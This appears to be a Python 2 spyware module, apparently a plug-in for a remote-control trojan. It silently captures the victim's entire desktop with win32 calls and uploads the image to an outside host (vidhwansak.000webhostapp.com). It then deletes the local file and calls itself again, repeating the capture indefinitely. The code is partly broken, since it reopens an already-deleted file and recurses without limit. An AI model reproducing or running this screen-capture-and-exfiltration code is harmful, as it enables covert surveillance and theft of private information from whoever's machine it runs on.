import win32gui
import win32ui
import win32con
import win32api
import requests
import os
import time

def run(**args):
# grab a handle to the main window
   hdesktop = win32gui.GetDesktopWindow()
   print "In screenshot"
# determine monitor size in pixels
   width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
   height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
   left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
   top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

# create a device context
   desktop_dc = win32gui.GetWindowDC(hdesktop)
   img_dc = win32ui.CreateDCFromHandle(desktop_dc)

# create a memory based device cotext 
   mem_dc = img_dc.CreateCompatibleDC()

# create a bitmap image
   screenshot = win32ui.CreateBitmap()
   screenshot.CreateCompatibleBitmap(img_dc, width , height)
   mem_dc.SelectObject(screenshot)
   mem_dc.BitBlt((0,0), (width,height) , img_dc , (left,top) , win32con.SRCCOPY)

# SAVE
   screenshot.SaveBitmapFile(mem_dc, "screenshot.bmp")

#free objects
   mem_dc.DeleteDC()
   win32gui.DeleteObject(screenshot.GetHandle())

#Send to remote server
   time.sleep(20)
   url = "http://vidhwansak.000webhostapp.com/site.php/post"
   files = {'image': open('screenshot.bmp','rb')}
   try:
     r = requests.post(url, files=files)
     os.remove("screenshot.bmp")
   except:
     pass
   f_des = open("screenshot.bmp" , "rb")
   data = f_des.read()
   f_des.close()
   os.remove("screenshot.bmp")
   run()
   return data

